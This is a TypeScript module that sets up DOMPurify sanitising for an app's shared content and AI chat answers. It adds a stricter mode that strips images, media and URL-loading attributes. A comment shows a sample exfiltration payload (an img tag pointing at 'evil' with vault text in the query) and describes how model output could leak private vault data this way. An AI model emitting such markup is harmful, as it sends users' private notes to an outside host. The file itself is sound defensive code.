import DOMPurify, { type Config } from 'dompurify'

/**
 * The one sanitiser for HTML built from text the app did not write (shared
 * Thoughts, model answers that quote vault files). HTML only — no SVG or
 * MathML, where most parser-confusion bypasses live — and no `<style>`,
 * `style` attributes or forms, so content cannot restyle or overlay the app.
 */
const CONFIG: Config = {
  USE_PROFILES: { html: true },
  FORBID_TAGS: ['style', 'form'],
  FORBID_ATTR: ['style'],
  ADD_ATTR: ['target'],
}

/**
 * For text a model wrote. The app's CSP lets pages load `https:` images (notes
 * have remote pictures), so an answer that makes the browser fetch a URL can
 * carry vault text out in it: `<img src="https://evil/?q=…">`, and likewise a
 * video poster, a `srcset`, an image input or a legacy `background`. None of
 * them belong in an answer, so none survive; a link does, and loads nothing
 * until it is clicked.
 */
const NO_REMOTE_LOADS: Config = {
  ...CONFIG,
  FORBID_TAGS: [
    ...(CONFIG.FORBID_TAGS ?? []),
    'img',
    'picture',
    'source',
    'video',
    'audio',
    'track',
    'input',
    'link',
  ],
  FORBID_ATTR: [...(CONFIG.FORBID_ATTR ?? []), 'src', 'srcset', 'poster', 'background', 'ping'],
}

let plain: typeof DOMPurify | null = null
let newTab: typeof DOMPurify | null = null

/** Instances are made on first use; hooks are per instance. */
function instance(linksInNewTab: boolean): typeof DOMPurify {
  if (!linksInNewTab) return (plain ??= DOMPurify())
  if (!newTab) {
    newTab = DOMPurify()
    // Chat is a single-page shell: an external link must not navigate it
    // away. Vault links (`a.chat-vault-source`) are opened in the app instead.
    newTab.addHook('afterSanitizeAttributes', (node) => {
      if (node.tagName !== 'A' || node.classList.contains('chat-vault-source')) return
      node.setAttribute('target', '_blank')
      node.setAttribute('rel', 'noopener noreferrer nofollow')
    })
  }
  return newTab
}

function escapeHtml(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

export function sanitizeHtml(
  html: string,
  opts: { linksInNewTab?: boolean; noRemoteLoads?: boolean } = {},
): string {
  const purify = instance(opts.linksInNewTab ?? false)
  // No DOM to sanitise in: show the markup as text rather than pass it through.
  if (!purify.isSupported) return escapeHtml(html)
  return purify.sanitize(html, opts.noRemoteLoads ? NO_REMOTE_LOADS : CONFIG) as string
}
